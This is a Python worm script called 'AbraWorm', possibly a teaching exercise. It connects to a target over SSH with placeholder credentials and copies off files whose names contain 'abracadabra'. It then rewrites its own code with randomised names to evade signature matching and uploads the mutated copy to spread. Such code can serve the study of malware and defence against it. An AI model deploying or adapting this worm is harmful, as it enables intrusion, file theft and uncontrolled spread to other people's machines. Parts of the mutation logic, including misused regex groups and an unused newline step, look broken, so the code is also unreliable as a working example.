import sys
import os
import random
import paramiko
import scp
import signal
import re
import shutil as sh


def sig_handler(signum, frame):
    os.kill(os.getpid(), signal.SIGKILL)


signal.signal(signal.SIGINT, sig_handler)


files_of_interest_at_target = []


def infect():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("<IP>", port=22, username="<usr>", password="<pass>", timeout=5)
    print("\n\nconnected\n")
    stdin, stdout, stderr = ssh.exec_command("cd <Dir>; ls")
    received_list = list(map(lambda x: str(x.strip()), stdout.readlines()))
    print("\n\noutput of 'ls' command: %s" % str(received_list))
    if "".join(received_list).find("AbraWorm") >= 0:
        print("\nThe target machine is already infected\n")
        return

    # Now let's look for files that contain the string 'abracadabra'
    cmd = "ls | grep abracadabra"
    stdin, stdout, stderr = ssh.exec_command(cmd)
    error = stderr.readlines()
    if error != []:
        print(error)

    received_list = list(map(lambda x: x.encode("utf-8"), stdout.readlines()))

    for item in received_list:
        files_of_interest_at_target.append(item.strip())

    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))

    # success till here
    scpcon = scp.SCPClient(ssh.get_transport())

    if len(files_of_interest_at_target) > 0:
        for target_file in files_of_interest_at_target:
            scpcon.get(target_file)

    print("Replicating Worm...")

    # Read contents of file into memory
    with open(sys.argv[0], "r") as f:
        contents = f.read()

    # Split contents into list of lines
    lines = contents.splitlines()

    # Choose random lines to add newlines between
    lines_to_add_newlines = random.sample(range(len(lines)), k=min(len(lines), 5))

    # Add newline characters between chosen lines
    for i, line in enumerate(lines):
        if i in lines_to_add_newlines:
            lines[i] = "\n" + line

    # Define regex pattern to match comment blocks
    comment_pattern = r"(^\s*#.*$)"

    def modify_function_name(match):
        function_name = match.group(1)
        modified_name = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=len(function_name)))
        return "def " + modified_name + match.group(2)

    def modify_for_loop(match):
        var_name = match.group(1)
        range_str = match.group(2)
        modified_var_name = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=len(var_name)))
        return "for " + modified_var_name + " in " + range_str + match.group(3)

    # Modify function names and for loops
    contents_with_characters = re.sub(r"(def\s+)(\w+)", modify_function_name, contents)
    contents_with_characters = re.sub(r"(for\s+)(\w+)\s+in\s+(.+):", modify_for_loop, contents_with_characters)

    modified_code = contents_with_characters

    # Join statements back together with newlines
    with open("Abra.py", "w") as out_file:
        out_file.write(modified_code)

    scpcon.put("Abra.py", "target.py")
    scpcon.close()
    
infect()
